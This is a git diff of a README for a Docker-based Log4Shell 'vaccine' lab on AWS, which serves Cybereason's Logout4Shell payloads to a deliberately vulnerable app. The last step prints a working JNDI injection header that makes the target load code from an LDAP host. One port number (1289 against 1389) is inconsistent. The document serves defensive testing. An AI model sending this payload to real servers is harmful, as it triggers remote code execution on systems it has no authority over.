@@ -8,7 +8,7 @@ With the guidance from the Apache software foundation, the best mitigation again
 vulnerability organizations like Cybereason and FullHunt have developed tools to scan for the vulnerability and mitigate this risk without the need to patch 
 or restart the server.
 
-Logout4Shell Container is not intended to take any credit for the research and development of these tools, but was developed for ease of deployment
+Logout4Shell Container is not intended to take any credit for the research and development of these tools, but was developed for POC and ease of deployment.
 
 More information regarding these tools can be found on [Cybereason Logout4Shell](https://github.com/Cybereason/Logout4Shell/blob/main/README.md) and 
 [FullHunt log4j-scan](https://github.com/fullhunt/log4j-scan/blob/master/README.md)
@@ -16,24 +16,20 @@ More information regarding these tools can be found on [Cybereason Logout4Shell]
 
 ## How Logout4Shell Container works
 
-The Logout4Shell Container is multi-container application consisting of the Cybereason webserver which hosts the Transient and Persistent payloads and the ldap 
-server which enables communication to the webserver through the lookup. Once the Logout4shell container is deployed either locally or externally and inbound 
-connections are whitelisted between the Logout4shell container and vulnerable server on ports 1389 and 8888, you can then SSH into the container and execute 
-a curl command to the vulnerable server with an appropriate HTTP header. This command initiates the lookup to the ldap server which will then redirect to the 
-webserver to deliver the payload.
+The Logout4Shell Container is multi-container application consisting of the Cybereason Logout4Shell webserver which hosts the Transient and Persistent payloads and the ldap server which enables communication to the webserver through the lookup. Once the Logout4shell container is deployed either locally or externally and inbound connections are whitelisted between the Logout4shell container and vulnerable server on ports 1389 and 8888, you can then SSH into the container and execute a curl command to the vulnerable server with an appropriate HTTP header. This command initiates the lookup to the ldap server which will then redirect to the webserver to deliver the payload.
 
 ## POC Test Environment
 
-1.	Vulnerable app deployed via a Docker container on an Amazon Linux 2, t2.micro, EC2 instance. More information regarding this vulnerable app can be found 
-on [Log4Shell sample vulnerable application]( https://github.com/christophetd/log4shell-vulnerable-app/blob/main/README.md).
-3.	FullHunt log4j scan deployed as a Docker container on an Amazon Linux 2, t2.micro, EC2 instance.
-4.	Logout4Shell Container deployed on an Amazon Linux 2, t2.micro, EC2 instance.
+- Logout4Shell Container deployed on an Amazon Linux 2 AMI (HVM) - Kernel 5.10, 8 GB General Purpose SSD Volume Type, t2.micro, EC2 instance.
+- FullHunt log4j scan deployed via a Docker container on an Amazon Linux 2 AMI (HVM) - Kernel 5.10, 8 GB General Purpose SSD Volume Type, t2.micro, EC2 instance.
+- Vulnerable app deployed via a Docker container on an Amazon Linux 2 AMI (HVM) - Kernel 5.10, 8 GB General Purpose SSD Volume Type, t2.micro, EC2 instance. More information regarding this vulnerable app can be found on [Log4Shell sample vulnerable application]( https://github.com/christophetd/log4shell-vulnerable-app/blob/main/README.md).
+
 
 ## Test Environment Setup
 
 ### Logout4Shell Container
 
-1. Launch an EC2 instance with the user data script below. This will run an OS update, install and start the Docker engine, ensure that the Docker daemon starts after each system reboot, and install git.
+1. Launch an EC2 instance with the user data script below. This will run an OS update, install and start the Docker engine, ensure that the Docker daemon starts after each system reboot, add the ec2-user to the docker group so you can execute Docker commands without using sudo and install git.
 ```
 #!/bin/bash
 yum update -y
@@ -41,11 +37,12 @@ amazon-linux-extras install -y docker
 service docker start
 system reboot
 systemctl enable docker
+usermod -a -G docker ec2-user
 yum install -y git
 ```
-2. SSH into your instance and run the command below. This will download and install latest version of Docker Compose.
+2. SSH into your instance and run the command below. This will download and install the latest version of Docker Compose.
 ```
-sudo curl -L "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose![image](https://user-images.githubusercontent.com/100946415/156798022-3e844434-6edb-4c14-aec7-9b7ceb94e456.png)
+sudo curl -L "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
 ```
 3. Adjust permissions.
 ```
@@ -53,7 +50,7 @@ sudo chmod +x /usr/local/bin/docker-compose
 ```
 4. Clone repository.
 ```
-sudo git clone https://github.com/gbarretto/logout4shell-container.git
+git clone https://github.com/gbarretto/logout4shell-container.git
 ```
 5. Change directory to logout4shell-container.
 ```
@@ -61,43 +58,41 @@ cd logout4shell-container
 ```
 6. Open var.env in GNU nano to edit.
 ```
-sudo nano var.env
+nano var.env
 ```
 7. Replace ```<host_ip>``` with the public IP address of the EC2 instance making sure to keep quotation marks.  
 8. Replace ```<mode_type>``` with Transient or Persistent making sure to keep quotation marks. 
 9. Press Control + X to bring you to Save modified buffer question. Then press Y. Then press Enter to write changes to var.env file.
-10. Build Docker images using command below.
+10. Build Docker images using the command below.
 ```
-sudo docker-compose build
+docker-compose build
 ```
 11. Launch the containers in detached mode.
 ```
-sudo docker-compose up -d
-```
-### Vulnerable app
-1. Launch an EC2 instance with same the user data script from above. 
-2. SSH into your instance and run the command below to run the vulnerable app via Docker.
-```
-docker run --name vulnerable-app --rm -p 443:8080 ghcr.io/christophetd/log4shell-vulnerable-app
+docker-compose up -d
 ```
 ### FullHunt log4j scan
-1. Launch an EC2 instance with the user data script below. This will run an OS update, install and start the Docker engine, ensure that the Docker daemon starts after each system reboot, and install git.
-```
-#!/bin/bash
-yum update -y
-amazon-linux-extras install -y docker
-service docker start
-system reboot
-systemctl enable docker
-yum install -y git
-```
-2. SSH into your instance and run the commands below to run FullHunt log4j scan.
+1. Launch an EC2 instance with the same user data script from above.
+2. SSH into your instance in a new terminal window and run the commands below to run FullHunt log4j scan.
 ```
 git clone https://github.com/fullhunt/log4j-scan.git
 cd log4j-scan
 sudo docker build -t log4j-scan .
 sudo docker run -it --rm log4j-scan
 ```
+### Vulnerable app
+1. Launch an EC2 instance with the same user data script from above. Adjust security group to allow inbound connection from the IP address of the Logout4Shell container on ports 1389 and 8888, and from the IP address of the FullHunt log4j scan on port 443.
+3. SSH into your instance in a new terminal window and run the command below to run the vulnerable app via Docker.
+```
+docker run --name vulnerable-app --rm -p 443:8080 ghcr.io/christophetd/log4shell-vulnerable-app
+```
+###Adjust Sedurity Group for Logout4Shell Container
+1. In the AWS Management Console adjust the security group for the Logout4Shell Container to allow inbound connection from the IP address of the Vulnerable App on ports 1289 and 8888.
 
+## How it works
+1. From the FullHunt log4j scan terminal window, execute the command below replacing ```<Vulnerable_App_IP_Address>``` with the IP address of the Vulmerable app instance and ```<Logout4Shell_Container_IP_address>``` with the IP address of the Logout4Shell Container instance.
+```
+curl <Vulnerable_App_IP_Address>:443 -H 'X-Api-Version: ${jndi:ldap://<Logout4Shell_Container_IP_address>:1389/a}'
+```
 
 
